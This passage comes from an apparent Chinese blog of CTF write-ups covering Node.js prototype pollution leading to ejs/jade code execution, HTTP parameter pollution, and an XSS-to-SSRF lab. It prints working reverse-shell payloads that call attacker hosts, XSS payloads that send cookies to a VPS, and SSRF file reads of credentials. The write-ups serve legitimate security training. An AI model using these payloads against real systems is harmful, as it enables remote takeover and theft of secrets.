中所有的对象的原型都可以继承到 Object，然后终点是 null 对象 如 web338 中所说的，当在当前上下文找不到相应对象时，会遍历 Object 对象是否存在相应的属性。 到这里就很清楚的知道了，为什么 query 的值是 &quot;return 2233&quot; ，因为在调用 copy 时，原型链被污染了。 至于 &#123; query: Function(query)(query)&#125; 为何为 &#123; query: 2233 &#125; JS 的函数实际上都是一个 Function 对象，它的参数为 1new Function ([arg1[, arg2[, ...argN]],] functionBody) 写个小demo 即 Function 对象传入构造函数里的前面参数是函数的形参，当然可以省略，最后的形参写函数体。 其实作用和 eval 有点类似，详细可以看 https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function 至此，利用思路明确了，只要污染了 query 对象，就可以执行任意我们想执行的代码，比如反弹个 shell 再获取 flag ~ 然后污染点和 web338 一致，在 login.js 里的 utils.copy(user,req.body); ，代码执行的触发点在 api.js 的 res.render(&#39;api&#39;, &#123; query: Function(query)(query)&#125;); 处。 payload ，这里用 nodejs 原生 socket，防止因系统运行环境问题 shell 弹不回来，这里服务器的监听端口为 2233 ，然后如何是 windows 系统就把 /bin/sh 换成 cmd.exe 应该就可以了。 1&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;服务器IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125; 先本地试试，这里服务器监听端口为 2233 1234567891011121314function copy(object1, object2)&#123; for (let key in object2) &#123; if (key in object2 &amp;&amp; key in object1) &#123; copy(object1[key], object2[key]) &#125; else &#123; object1[key] = object2[key] &#125; &#125; &#125;user = &#123;&#125;body = JSON.parse(&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = require(\\&#x27;net\\&#x27;),cp = require(\\&#x27;child_process\\&#x27;),sh = cp.spawn(\\&#x27;/bin/sh\\&#x27;, []);var client = new net.Socket();client.connect(2233, \\&#x27;服务器IP\\&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125;&#x27;);copy(user, body)&#123; query: Function(query)(query)&#125; ok，没啥大问题。 先 POST 一下 login 接口，污染 query 对象 然后直接 POST 一下 api 接口即可。 emm，发现不行，之后访问 /login 和 /api 接口都是 404 找不到文件 ，shell 也反弹不回来。 试试别人的 1&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/监听端口 0&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125; flag 仔细对比了一下，发现了，感觉是命名空间问题，即 require 可能不被识别，尝试把 require 改为 global.process.mainModule.constructor._load ，同样服务器监听端口为 2233 1&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;服务器IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125; 也是先 POST /login 接口污染 query 对象 访问下 /api 接口 反弹 shell 并获取 flag 然后顺便翻了个链接，好像确实如此~ https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js 因为 node 是基于 chrome v8 内核的，运行时，压根就不会有 require 这种关键字，模块加载不进来，自然 shell 就反弹不了了。但在 node交互环境，或者写 js 文件时，通过 node 运行会自动把 require 进行编译。 还有一个其他解，见 web338 中的 ejs RCE，一样的EXP、步骤和利用方式 web340 原型连污染 ++nodejs/v10.19.0 题目描述处蓝奏云下载源码 📎web340.zip 提取关键部分 123456789101112var flag=&#x27;flag_here&#x27;;var user = new function()&#123; this.userinfo = new function()&#123; this.isVIP = false; this.isAdmin = false; this.isAuthor = false; &#125;;&#125;utils.copy(user.userinfo,req.body);if(user.userinfo.isAdmin)&#123; res.end(flag);&#125; 发现 userinfo 的原型不是 Object 对象， userinfo.__proto__.__proto__ 才是 Object 对象。 和 web339 一样，只不过要套两层才能污染 Object 对象，同样用原生 socket，服务端监听端口为 2233 （ 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;服务器IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125;&#125; 同样 POST 一下 /login 接口污染 query 对象 POST 一下 /api 接口触发 获取 flag web341 原型链污染 +++题目描述处蓝奏云下载源码 📎web341.zip 这题和其他不同的是没有 /api 接口触发污染点了，所以使用 web338 中的 ejs RCE。 然后像 web340 一样污染要套两层。下面 EXP 也服务器监听端口是 2233 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;(function()&#123;var net=global.process.mainModule.constructor._load(&#x27;net&#x27;),cp=global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh=cp.spawn(&#x27;/bin/sh&#x27;,[]);var client=new net.Socket();client.connect(2233,&#x27;服务器IP&#x27;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();var __tmp2&quot;&#125;&#125;&#125; 注意这里的前面的 _tmp1; 和后面的 var __tmp2 不能删，web338 evil0 的分析有体现到，是为了闭合代码。 同样 POST 一下 /login 接口污染数据 然后请求一个会调用 render 方法的接口 即可获得 flag web342 原型链污染 ++++题目描述处蓝奏云下载源码 📎web342.zip 然后还有个提示 审计了1个小时发现的，此链目前网上未公开，难度稍大 本题就不是用 ejs 进行模板渲染了，而是使用了 jade 一开始想看其他师傅的文章 https://xz.aliyun.com/t/7025 emm，但是发现说的每个字都认识，连起来就觉得有点莫名其妙了。。于是想着先自己手动分析一下，熟悉一波，方便自己和师傅在同一个频道上，防止师傅说的每句话都感觉莫名其妙… 详细的断点分析参考 https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade 这里用 VS Code 来 debug 分析 就会自动创建这样一个文件 1234567891011121314151617&#123; // Use IntelliSense to learn about possible attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ &#123; &quot;type&quot;: &quot;pwa-node&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;name&quot;: &quot;Launch Program&quot;, &quot;skipFiles&quot;: [ &quot;&lt;node_internals&gt;/**&quot; ], &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;/bin/www&quot; &#125; ]&#125; 然后下个断点，运行一下，访问网页就可以开始愉快的 debug 了 这里直接用 ctfshow web342 的代码进行 依次进入 res.render=&gt;app.render=&gt;tryRender=&gt;view.render=&gt;this.engine 入口是 rederFile 方法，注意 renderFile 函数返回值可执行 进入 handleTemplateCache 进入 compile 函数 205行 有个 parse 解析，可以看到结果返回到 parsed，又传递给了 fn，先不管 parse 方法，继续向下看代码 218行 这里就比较有趣了，有个看似可控的代码执行（new Function，这个在 web339 有提到） 进入 parse 看看返回值中是否有可控部分 parse 方法内部可以看到先内部 parse 再内部 compile，内部 parse 结果最终会被拼接到外层 parse 函数返回值部分 即 114行的 js对象 被拼接到 148行 或 149行的 js对象 里，最终拼接到 body键 返回 先跟进 114行 的 compile 方法，发现本方法返回的是 buf 跟进 66行的 this.visit(this.node); 发现可控（因为 node.filename 被 utils.stringify() 了）的 node.line 可以被 push 到 buf 中，条件是 this.debug=true 然后在 212行的 this.visitNode(node); 去遍历 ast 树，遍历完后回到 compile 方法 可以看到 node.line 被记录到 fn 中，然后通过 Function 调用执行这部分代码。 也就是说如果我们可以污染 node.line 就可以运行我们代码。 也就是说 jade 本身是没有漏洞的，因为模板的渲染逻辑是如何，但问题是，如果存在可控的原型链污染，就可以帮助我们污染 node.line 。 于是尝试 POST /login 接口 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;)&quot;&#125;&#125;&#125; 断点发现，， node.line 值还是 0、1、2 之类的？ 突然醒悟，，还有一个问题，我们在调试过程中发现，node.line 是存在值的，比如上图中的 0、1、2 ，如果存在值的话，它会直接获取这个值，而不是获取我们污染过的 Object 对象里的值！ 其实原型链污染的利用核心就是：访问对象的属性/值为 undefined 才行，不然我们污染 Object 对象就没有意义了。 现在看这篇文章就能看懂了，而且发现总结的非常好。。 https://xz.aliyun.com/t/7025 好的，在同一频道上了。 先梳理上面分析的函数调用栈，我们断点入口在 routes/index.js res.render(&#39;index&#39;,&#123;title:&#39;ctfshow&#39;&#125;); ，调用栈如下 routes/index.js :: res.render jade/lib/index.js :: exports.__express jade/lib/index.js :: exports.renderFile jade/lib/index.js :: handleTemplateCache jade/lib/index.js :: exports.compile jade/lib/index.js :: parse -&gt; compiler.compile(); jade/lib/compiler.js :: Compiler.compile -&gt; this.visit(this.node) jade/lib/compiler.js :: this.visit jade/lib/compiler.js :: this.buf.push jade/lib/index.js :: parse -&gt; options.self jade/lib/index.js :: fn = new Function(‘locals, jade’, fn) jade/lib/index.js :: fn(locals, Object.create(runtime)) 至 4. a. iii. 这部分调用栈用下图，4. b. c. d. 的在上面 debug 也有提及，因此调用栈这部分问题不大 问题有 3 visit 方法中 this.debug=true ，不然 this.buf.push 调用不了 在上面提到的：node.line 在某处为 undefined 才行，不然我们污染的 Object 对象就没意义 保证能够执行到渲染阶段，因为覆盖某些属性会导致莫名其妙的异常 第 1 个问题容易解决，因为在 Jade 入口 exports.__express ，我们上面 deubg 分析时也看到 123456exports.__express = function (path, options, fn) &#123; if (options.compileDebug == undefined &amp;&amp; process.env.NODE_ENV === &#x27;production&#x27;) &#123; options.compileDebug = false; &#125; exports.renderFile(path, options, fn);&#125; options.compileDebug 无初始值，可以覆盖开启 Debug 模式（经分析，this.debug 获取的就是这里的 debug 值），当然也有另外一种情况，部署时，没有正确配置 req.app.get(&#39;env&#39;) 导致 debug 模式开启，那么这个变量也可以不用覆盖，但为了确保通用性，这里还是覆盖一下，防止正确配置，2333。 这里因 utils.copy(user.userinfo,req.body); 与 web341一样，userinfo.__proto__.__proto__ 才是 Object 对象的原型，所以要套两层。 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1&#125;&#125;&#125; 先打一下 第 3 个问题提前出现了，要先解决这个问题，保证代码能够执行到渲染阶段 和先知文章里不同，这里报错有点不一样，先跟进 Compiler.visitNode 225行看一下 拼接一下，发现没有这个方法 在遍历AST树时，通常是通过 &quot;visit&quot; + 节点类型 来遍历所有节点的，观察错误调用栈也知，比如 visitBlock，就是访问 Block 节点。那 Block 可用，我们就污染一下 type 就好了，当它当前上下文找不到就去找 Object 了。 当然选取时，最好是选的节点附带的上下文信息进入后，啥事也不会做的，不然也有走向奇奇怪怪的逻辑，先来看看 Block 节点。 这里加上这部分逻辑，来看看我们故意伪造 Block 节点会发生什么 123if (node.type == undefined) &#123; return this[&#x27;visit&#x27; + &#x27;Block&#x27;](node);&#125; 这里 block.nodes 为 undefined ，然后 undefined.length 明显，这样访问会报错，导致进入其他错误，然后 jade 没有对这块异常进行处理。 也就是说，如果 vist 的节点不是这种 block.子属性.孙子属性 问题应该不大。顶多一个 undefined 然后直接结束啥的，这里试试 visitCode ， 正常走到后面，没有报错，期间只触发了 this.buf.push(code.val) ，问题应该不大。 尝试污染 type 为 Code 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;&#125;&#125;&#125; 好耶，像是解决了，因为这个报错和先知文章报错一致。 尝试解决这个报错，因为看错误调这里好像还没到渲染成功的地方。 分析这个错误栈，可以看到前 4 点还是属于 jade 范畴。先跟进 jade 模块最后报错的地方，即 jade/libindex.js 149行的 parse 方法， 发现，程序已经走完刚刚AST遍历部分了，已经差不多要返回了。 感觉只要避免进入149行的 addWith 方法，就可以渲染成功了！ 然后进入149行的 addWith 方法是满足147行的 options.self 值为 False，尝试下看看这个 options.self 默认是不是 undefined，如果是就可以污染了。 nice，就是 undefined ，尝试污染 self 为 true ，1 也可以 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1&#125;&#125;&#125; ！！！终于走到渲染这一步了！ 看到 undefined 好说，污染就完事了 （ 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;title&quot;:&quot;tari&quot;&#125;&#125;&#125; 到这 index 的页面渲染就没啥问题了，到 第 2 个问题，node.line 在某处为 undefined 才行，不然我们污染的 Object 对象就没意义 这里如果一步一步动态调试会比较麻烦，直接注入测试即可 发现都 node 为 Block 的时候 line 是不存在的。 理论上，只要覆盖了 node.line 即可达到代码执行的目的。 然后拼接上面避免报错的参数，得到 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;title&quot;:&quot;tari&quot;,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/2233&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125;&#125; 反弹 Shell 再 POST一次，发送的数据包不用变 不就少了个 message，那我污染你呗，，然后 message 后又说少了 error 继续污染，然后 error 是一个对象，就需要弄个 json 格式数据啦。 emmm，到这，其实一开始就犯了个很蠢的错。。。其实一开始就应该污染 line 先的，然后在试 compileDebug、type、self，蠢哭了，，因为，如果不污染 line 先的话，不能保证在 line 正确的情况下试其他的，就会导致，，其他对了，加上 line 就错了。。 其实这里，压根就不用污染 title，如果是 先污染 line，然后到 compileDebug、type、self 会发现，到 self 这就可以成功反弹 shell 了，人都傻了。。。 最终 EXP 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/119.28.15.55/2233 0&gt;&amp;1\\&quot;&#x27;)&quot;&#125;&#125;&#125; 不用变，在POST一次即可 原本想用原生Socket的，不知道为啥老是报错，奇怪，，难道闭合不了？ 1&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;compileDebug&quot;:1,&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;(function()&#123;var net=global.process.mainModule.constructor._load(&#x27;net&#x27;),cp=global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh=cp.spawn(&#x27;/bin/sh&#x27;,[]);var client=new net.Socket();client.connect(2233,&#x27;服务器IP&#x27;,function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125;&#125; web343 原型链污染 +++++说有过滤，但 web342一样的 EXP 也可以打，反弹shell后看源码才发现确实多了点东西 login.js 1234567891011121314151617181920212223242526272829303132var express = require(&#x27;express&#x27;);var router = express.Router();var utils = require(&#x27;../utils/common&#x27;);/* GET home page. */router.post(&#x27;/&#x27;, require(&#x27;body-parser&#x27;).json(),function(req, res, next) &#123; res.type(&#x27;html&#x27;); var user = new function()&#123; this.userinfo = new function()&#123; this.isVIP = false; this.isAdmin = false; this.isAuthor = false; &#125;; &#125;; if(JSON.stringify(req.body).match(/Text/ig))&#123; res.end(&#x27;hacker go away&#x27;); &#125;else&#123; utils.copy(user.userinfo,req.body); if(user.userinfo.isAdmin)&#123; return res.json(&#123;ret_code: 0, ret_msg: &#x27;登录成功&#x27;&#125;); &#125;else&#123; return res.json(&#123;ret_code: 2, ret_msg: &#x27;登录失败&#x27;&#125;); &#125; &#125;&#125;);module.exports = router; emmm 有点不懂这个 JSON.stringify(req.body).match(/Text/ig) 过滤有啥意义就是了。。 和web342一样的EXP web344 HPP代码 1234567891011121314router.get(&#x27;/&#x27;, function(req, res, next) &#123; res.type(&#x27;html&#x27;); var flag = &#x27;flag_here&#x27;; if(req.url.match(/8c|2c|\\,/ig))&#123; res.end(&#x27;where is flag :)&#x27;); &#125; var query = JSON.parse(req.query.query); if(query.name===&#x27;admin&#x27;&amp;&amp;query.password===&#x27;ctfshow&#x27;&amp;&amp;query.isVIP===true)&#123; res.end(flag); &#125;else&#123; res.end(&#x27;where is flag. :)&#x27;); &#125;&#125;); 即 url 中不能包含大小写 8c、2c 和 逗号 先构造一个正常请求 1/?query=&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125; 发现题目会过滤掉逗号，尝试 URL 编码， urlencode(&quot;,&quot;) = %2c 发现 2c 也被过滤 HTTP协议中允许同名参数出现多次，不同服务端对同名参数处理都是不一样的，下面链接列举了一些 https://www.cnblogs.com/AtesetEnginner/p/12375499.html nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析。 因此构造 1/?query=&#123;&quot;name&quot;:&quot;admin&quot;&amp;query=&quot;password&quot;:&quot;%63tfshow&quot;&amp;query=&quot;isVIP&quot;:true&#125; 这里把 c进行url编码，是因为 双引号 的url编码是 %22，和 c 连接起来就是 %22c，会匹配到正则表达式。 一些参考的题解 https://blog.csdn.net/solitudi/article/details/111669500 https://blog.csdn.net/miuzzx/article/details/111780832 http://www.babyitellyou.com/details?id=60669eee0a6c6440e0560f2d","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctfshow","slug":"ctf/ctfshow","permalink":"https://tari.moe/categories/ctf/ctfshow/"},{"name":"ctf练习","slug":"ctf/ctfshow/ctf练习","permalink":"https://tari.moe/categories/ctf/ctfshow/ctf%E7%BB%83%E4%B9%A0/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://tari.moe/tags/ctfshow/"},{"name":"ctf练习","slug":"ctf练习","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"}]},{"title":"XSS & SSRF组合拳","slug":"2021/xssrf","date":"2021-04-26T01:58:40.000Z","updated":"2022-02-01T04:24:11.420Z","comments":true,"path":"/p/2021/xssrf/","link":"","permalink":"https://tari.moe/p/2021/xssrf/","excerpt":"","text":"去年实习中就遇到一个场景，用 xss 去打 redis，想着刷刷靶场练习一下，然后就在收藏夹吃了一年的灰了。。 https://xssrf.hackme.inndy.tw/ 即下面链接的 38 - 40 题 https://hackme.inndy.tw/scoreboard 扫描一下目录，发现 robots.txt 里有三条信息 123Disallow: /config.phpDisallow: /you/cant/read/config.php/can/you?Disallow: /backup.zip 发现 backup.zip 有密码打不开 xssme随便用个帐号注册登录一下，在 Mailbox 收到管理员发来的邮件 I am admin from this website, I will read all your mails but never reply. 也就是会一直读我发的邮件，但是不会回复，也就是没有回显。 直接上 payload 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233&#x27;&quot;&gt; 这里用 svg/onload 是为了绕过空格限制 可以正常通信 获取管理员 Cookie 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+document.cookie&quot;&gt; 奇怪，接收不到 但通过导航栏 Sent Mail 可以获取自己的。。。试试通过接收平台来接收 http://ceye.io/ 1&lt;svg/onload=&quot;document.location=&#x27;http://c6i7bf.ceye.io/&#x27;+document.cookie&quot;&gt; 只有 dns 解析记录，没有 http 请求记录。。XSS平台Cookie字段为空。。。 奇怪了，然后试试 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+document.cooki&quot;&gt; 发现返回正常，难道，过滤了cookie关键字？或者，，Cookie里的特殊字段导致 HTTP包异常？尝试对获取到的 cookie 进行编码。 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(document.cookie)&quot;&gt; 为啥用 btoa 呢，因为一开始试过了 escape 不过没用… escape 后 Cookie里也没空格的样子emmm 因为题目过滤了 ) ，所以需要HTML编码一下双引号里面的。 https://www.qqxiuzi.cn/bianma/zifushiti.php 好耶！ 第一个flag 1FLAG&#123;Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;/script&gt;&#125; 并提示了第二个 flag 在 redis 里 xssrf leak尝试用 xssme 得到的 admin cookie ，尝试 XFF 也是如此。 这里先读一下 admin 页面 1&lt;svg/onload=&quot;document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(document.body.innerHTML)&quot;&gt; 同样引号里的东西HTML编码一下给管理员发邮件 正常收到 把这一串 base64解码一下，提取关键信息，发现主要多了 Set Admin 和 Send Request 两个功能。 1234567891011121314151617&lt;ul class=&quot;navbar-nav&quot;&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sendmail.php&quot;&gt;Send Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;mailbox.php&quot;&gt;Mailbox&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;sentmail.php&quot;&gt;Sent Mail&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;setadmin.php&quot;&gt;Set Admin&lt;/a&gt; &lt;/li&gt; &lt;li class=&quot;nav-item&quot;&gt; &lt;a class=&quot;nav-link&quot; href=&quot;request.php&quot;&gt;Send Request&lt;/a&gt; &lt;/li&gt;&lt;/ul&gt; 通过 AJAX 请求分别请求一下 setadmin.php 和 request.php 看看 123456789101112&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);xmlhttp.send();&quot;&gt; 一样HTML编码一下双引号里面的部分，同样在导航栏 Send Mail 部分发送 base64解码提取关键部分 1234567&lt;form action=&quot;/request.php&quot; method=&quot;POST&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;url&quot;&gt;URL&lt;/label&gt; &lt;textarea name=&quot;url&quot; class=&quot;form-control&quot; id=&quot;url&quot; aria-describedby=&quot;url&quot; placeholder=&quot;URL&quot; rows=&quot;10&quot;&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;button class=&quot;btn btn-primary&quot;&gt;Send Request&lt;/button&gt;&lt;/form&gt; 还有 setadmin.php 同样，结果 base64解码 提取关键部分 1234567&lt;form action=&quot;/setadmin.php&quot; method=&quot;POST&quot;&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;label for=&quot;username&quot;&gt;Username&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; id=&quot;username&quot; aria-describedby=&quot;username&quot; placeholder=&quot;Username&quot;&gt; &lt;/div&gt; &lt;button class=&quot;btn btn-primary&quot;&gt;Give Admin Access&lt;/button&gt;&lt;/form&gt; 这里试试能不能通过 setadmin.php 设置管理员，之后操作也方式一点点。 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;setadmin.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;username=tari&quot;);&quot;&gt; 得到返回信息… 1&lt;div class=&quot;alert alert-warning&quot;&gt;This user is already a admin.&lt;/div&gt; 那继续通过这种方式获取利用 request.php 吧，存在 SSRF 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=file:///etc/passwd&quot;);&quot;&gt; 读了一下 /etc/passwd 1234567891011121314151617181920212223242526root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologinsystemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/falsesystemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/falsesystemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/falsesystemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false_apt:x:104:65534::/nonexistent:/bin/falsemessagebus:x:105:107::/var/run/dbus:/bin/falsemysql:x:106:108:MySQL Server,,,:/nonexistent:/bin/falseredis:x:107:110::/var/lib/redis:/bin/false 发现 www-data 解析目录为 /var/www 并且有 redis 用户 尝试了 /proc/self/environ 和 /proc/self/cmdline 都无法获取准确的 web 根目录，只能猜了，比如 /var/www/html （ 读取一下扫描目录发现的 config.php 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=file:///var/www/html/config.php&quot;);&quot;&gt; 解码一下得到 12345678910111213141516&lt;?php// database configdefine(&#x27;DB_USER&#x27;, &#x27;xssrf&#x27;);define(&#x27;DB_PASS&#x27;, &#x27;xssrfmeplz&#x27;);define(&#x27;DB_HOST&#x27;, &#x27;host=localhost&#x27;);define(&#x27;DB_NAME&#x27;, &#x27;xssrf&#x27;);// redis configdefine(&#x27;REDIS_HOST&#x27;, &#x27;localhost&#x27;);define(&#x27;REDIS_PORT&#x27;, 25566);// define flagdefine(&#x27;FLAG&#x27;, &#x27;FLAG&#123;curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck&#125;&#x27;);$c_hardness = 5; // how many proof of work leading zeros 第 2 个 flag 1FLAG&#123;curl -v -o flag --next flag://in-the.redis/the?port=25566&amp;good=luck&#125; 说好的第 2 个 flag 在 redis 里呢… xssrf redis上一个 flag 提示 redis 端口在 25566 先试试 gopher 协议 未授权打 redis 12345678910111213&lt;svg/onload=&quot;xmlhttp=new XMLHttpRequest();xmlhttp.onreadystatechange=function()&#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; document.location=&#x27;http://vps_ip:2233/&#x27;+btoa(xmlhttp.responseText); &#125;&#125;xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application/x-www-form-urlencoded&quot;);xmlhttp.send(&quot;url=gopher://127.0.0.1:25566/_info%250a&quot;);&quot;&gt; 